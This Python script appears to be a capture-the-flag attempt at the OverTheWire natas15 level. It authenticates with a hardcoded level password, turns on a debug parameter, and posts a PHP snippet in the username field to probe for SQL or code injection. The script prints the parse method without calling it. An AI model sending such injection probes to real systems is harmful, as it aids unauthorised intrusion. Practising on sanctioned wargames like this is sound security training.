import requests
from bs4 import BeautifulSoup
from requests.auth import HTTPBasicAuth

password = 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'
username = 'natas15'

# SQL: SELECT * FROM users where username="""

data = {
        'username': '<?php echo "dupa";'
        }

get_data = {
        'debug': 'true'
        }

get = ''
for k, v in get_data.items():
    get += '{}={}&'.format(k, v)

if get:
    get = '?' + get[:-1]

url = 'http://{}.natas.labs.overthewire.org{}'.format(username, get)

auth = HTTPBasicAuth(username, password)

response = requests.post(url, auth=auth, data=data)

bs4 = BeautifulSoup(response.content, 'html.parser')

print(bs4.prettify)
